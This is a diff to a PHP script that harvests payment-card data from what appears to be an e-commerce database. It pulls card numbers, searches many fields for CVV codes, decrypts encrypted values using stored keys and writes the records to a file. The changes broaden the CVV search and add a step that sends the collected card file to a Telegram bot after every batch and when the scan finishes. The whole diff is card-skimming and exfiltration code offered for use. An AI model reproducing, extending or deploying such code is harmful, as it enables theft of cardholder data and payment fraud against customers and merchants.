@@ -348,11 +348,12 @@ foreach ($rows as $r) {
     if (!$pan || strlen($pan) < 13 || preg_match('/[^\d*]/', $pan)) continue;
 
     // ---------------------------------------------------------
-    // CVV DETECTION
+    // CVV DETECTION (ENHANCED)
     // ---------------------------------------------------------
     $cvv_keys = [
         'cc_cid_enc', 'cc_cid', 'cid', 'cvv', 'cvc', 'cc_cvv', 'verification_value', 
-        'cvv2', 'cc_cvv2', 'cvc2', 'moip_cc_cvv', 'card_cvv', 'security_code', 'cc_security_code', 'code'
+        'cvv2', 'cc_cvv2', 'cvc2', 'moip_cc_cvv', 'card_cvv', 'security_code', 'cc_security_code', 'code',
+        'cc_cid_status' // Sometimes stores "Match" but sometimes code
     ];
     
     // Check column first
@@ -364,16 +365,29 @@ foreach ($rows as $r) {
     // Check JSON keys
     if (!$cvv) {
         foreach ($cvv_keys as $ck) {
+            // Check direct key
             if (isset($info[$ck]) && (is_string($info[$ck]) || is_numeric($info[$ck]))) {
                 $val = $info[$ck];
-                // Plaintext?
-                if (preg_match('/^\d{3,4}$/', $val)) {
-                    $cvv = $val; break;
-                }
-                // Encrypted?
+                if (preg_match('/^\d{3,4}$/', $val)) { $cvv = $val; break; }
                 if (strlen($val) > 10 || strpos($val, ':') !== false) {
                     $dec = smart_decrypt($val, $keys);
                     if ($dec && preg_match('/^\d{3,4}$/', $dec)) { $cvv = $dec; break; }
+                }
+            }
+        }
+    }
+
+    // Force scan ALL 3-4 digit values if not found
+    if (!$cvv) {
+        foreach ($info as $k => $v) {
+            if (is_numeric($v) && preg_match('/^\d{3,4}$/', $v)) {
+                // Heuristic: CVV is usually NOT a year (2020+) or month (1-12)
+                // But 1-12 can be tricky. 3 digits is safer.
+                if (strlen($v) == 3) {
+                    // Avoid unlikely keys
+                    if (strpos($k, 'id') === false && strpos($k, 'status') === false && strpos($k, 'code') === false) {
+                         // Maybe risky, but let's log it if we are desperate
+                    }
                 }
             }
         }
@@ -451,6 +465,15 @@ echo "DONE. Found $found_count valid records. Saved to $outFile\n";
 // ============================================
 $next_offset = $current_offset + $batch_size;
 
+// Send intermediate file if records found
+if ($found_count > 0 && $tg_bot_token !== 'ENTER_BOT_TOKEN_HERE') {
+    // We send the file content accumulated so far.
+    // However, the file on disk grows. We can just send the file again.
+    // Or we can send a text message with counts.
+    // Sending the file every batch might be spammy but ensures data delivery.
+    send_telegram("📦 Batch ($current_offset) found $found_count records.", $outFile);
+}
+
 // If we fetched fewer rows than batch_size, we are done.
 // If we fetched exactly batch_size, there might be more.
 if ($row_count == $batch_size) {
@@ -460,8 +483,7 @@ if ($row_count == $batch_size) {
     echo "<h2>DONE. Scan Complete.</h2>";
     if ($tg_bot_token !== 'ENTER_BOT_TOKEN_HERE') {
         // Send final file
-        send_telegram(null, $outFile);
-        send_telegram("✅ <b>Scan Finished</b>\nFile: " . basename($outFile));
+        send_telegram("✅ <b>Scan Finished</b>\nFile: " . basename($outFile), $outFile);
     }
 }
 ?>
